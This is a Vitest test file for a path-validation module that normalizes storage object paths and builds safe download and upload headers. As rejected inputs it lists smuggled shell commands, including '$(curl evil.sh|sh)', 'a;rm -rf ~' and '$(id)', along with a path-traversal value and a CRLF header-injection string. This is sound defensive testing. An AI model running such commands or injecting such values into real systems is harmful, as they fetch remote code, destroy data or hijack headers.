import { describe, expect, it } from 'vitest';
import {
  MAX_KEY_BYTES, SpacePathError, downloadResponseHeaders, movedPath, normalizeFilePath, normalizePrefix, objectKey,
  pathOfKey, uploadContentType, validateSpaceName,
} from './spacePaths';

const SPACE = 'cmabcdefghijklmnopqrstuvw';

describe('normalizeFilePath', () => {
  it('accepts nested relative paths', () => {
    expect(normalizeFilePath('a/b/c.txt')).toBe('a/b/c.txt');
    expect(normalizeFilePath('file name (1).png')).toBe('file name (1).png');
  });

  it('normalizes to NFC', () => {
    const decomposed = 'cafe\u0301.txt';
    expect(normalizeFilePath(decomposed)).toBe('caf\u00e9.txt');
  });

  it.each([
    ['', 'empty'],
    ['/etc/passwd', 'leading slash'],
    ['a/../b', 'dot-dot'],
    ['..', 'bare dot-dot'],
    ['./a', 'dot'],
    ['a//b', 'empty segment'],
    ['a\\b', 'backslash'],
    ['a\u0000b', 'NUL'],
    ['a\nb', 'newline'],
    ['a\u0085b', 'C1 control'],
    ['dir/', 'trailing slash'],
  ])('rejects %j (%s)', input => {
    expect(() => normalizeFilePath(input)).toThrow(SpacePathError);
  });

  it('rejects non-strings', () => {
    expect(() => normalizeFilePath(undefined)).toThrow(SpacePathError);
    expect(() => normalizeFilePath(['a'])).toThrow(SpacePathError);
  });

  it.each([
    ['$(curl evil.sh|sh).md', '$('],
    ['notes/${HOME}.txt', '${'],
    ['a`id`.txt', 'backtick'],
    ["it's.txt", 'single quote'],
    ['say "hi".txt', 'double quote'],
    ['a;rm -rf ~', 'semicolon'],
    ['a|b', 'pipe'],
    ['a&b', 'ampersand'],
    ['a<b', 'less-than'],
    ['dir/a>b', 'greater-than'],
  ])('rejects shell metacharacters: %j (%s)', input => {
    expect(() => normalizeFilePath(input)).toThrow(SpacePathError);
  });

  it('keeps characters that run nothing in a shell', () => {
    for (const p of ['report (final) v2.pdf', 'img/*.png', 'a [draft]?.md', 'x#1 ~ {a,b} !.txt', 'naïve-café_1.2.txt']) {
      expect(normalizeFilePath(p)).toBe(p);
    }
  });
});

describe('normalizePrefix', () => {
  it('is empty for the root', () => {
    expect(normalizePrefix(undefined)).toBe('');
    expect(normalizePrefix('')).toBe('');
    expect(normalizePrefix('/')).toBe('');
  });

  it('always ends in a slash', () => {
    expect(normalizePrefix('a/b')).toBe('a/b/');
    expect(normalizePrefix('a/b/')).toBe('a/b/');
  });

  it('rejects traversal', () => {
    expect(() => normalizePrefix('../x')).toThrow(SpacePathError);
    expect(() => normalizePrefix('a//')).toThrow(SpacePathError);
  });

  it('rejects shell metacharacters', () => {
    expect(() => normalizePrefix('$(id)/')).toThrow(SpacePathError);
    expect(() => normalizePrefix('a;b')).toThrow(SpacePathError);
  });
});

describe('objectKey and pathOfKey', () => {
  it('prefixes with the space id', () => {
    expect(objectKey(SPACE, 'a/b.txt')).toBe(`${SPACE}/a/b.txt`);
    expect(pathOfKey(SPACE, `${SPACE}/a/b.txt`)).toBe('a/b.txt');
  });

  it('never maps another space\'s key', () => {
    expect(pathOfKey(SPACE, `${SPACE}x/a`)).toBeNull();
    expect(pathOfKey(SPACE, 'other/a')).toBeNull();
  });

  it('enforces the 1024-byte key limit in bytes, not characters', () => {
    const room = MAX_KEY_BYTES - SPACE.length - 1;
    expect(objectKey(SPACE, 'a'.repeat(room))).toHaveLength(MAX_KEY_BYTES);
    expect(() => objectKey(SPACE, 'a'.repeat(room + 1))).toThrow(SpacePathError);
    expect(() => objectKey(SPACE, '\u00e9'.repeat(Math.ceil(room / 2) + 1))).toThrow(SpacePathError);
  });
});

describe('movedPath', () => {
  it('moves a file to the target', () => {
    expect(movedPath('a.txt', 'b/c.txt', 'a.txt')).toBe('b/c.txt');
  });

  it('keeps the part below a moved directory', () => {
    expect(movedPath('a/', 'z/', 'a/b/c.txt')).toBe('z/b/c.txt');
  });
});

describe('validateSpaceName', () => {
  it('accepts lowercase names', () => {
    expect(validateSpaceName('team-assets-2')).toBe('team-assets-2');
  });

  it.each(['A', 'a', 'has space', 'x'.repeat(41), 'under_score', 'a:b'])('rejects %j', name => {
    expect(() => validateSpaceName(name)).toThrow(SpacePathError);
  });
});

describe('downloadResponseHeaders', () => {
  it('serves images inline with a type chosen from the extension', () => {
    expect(downloadResponseHeaders('img/cat.PNG', true)).toEqual({
      contentDisposition: 'inline; filename="cat.PNG"; filename*=UTF-8\'\'cat.PNG',
      contentType: 'image/png',
    });
  });

  it('never serves HTML or SVG inline', () => {
    expect(downloadResponseHeaders('x.html', true).contentDisposition).toMatch(/^attachment;/);
    expect(downloadResponseHeaders('x.svg', true).contentDisposition).toMatch(/^attachment;/);
    expect(downloadResponseHeaders('x.svg', true).contentType).toBeUndefined();
  });

  it('is an attachment unless inline was asked for', () => {
    expect(downloadResponseHeaders('cat.png', false).contentDisposition).toMatch(/^attachment;/);
  });

  it('encodes non-ASCII and quote characters in the filename', () => {
    const h = downloadResponseHeaders('dir/r\u00e9sum\u00e9 "v2".pdf', false).contentDisposition;
    expect(h).toBe('attachment; filename="r_sum_ _v2_.pdf"; filename*=UTF-8\'\'r%C3%A9sum%C3%A9%20%22v2%22.pdf');
  });
});

describe('uploadContentType', () => {
  it('keeps a well-formed type', () => {
    expect(uploadContentType('text/markdown; charset=utf-8')).toBe('text/markdown; charset=utf-8');
  });

  it('falls back for anything else', () => {
    expect(uploadContentType(undefined)).toBe('application/octet-stream');
    expect(uploadContentType('text/html\r\nX-Evil: 1')).toBe('application/octet-stream');
  });
});
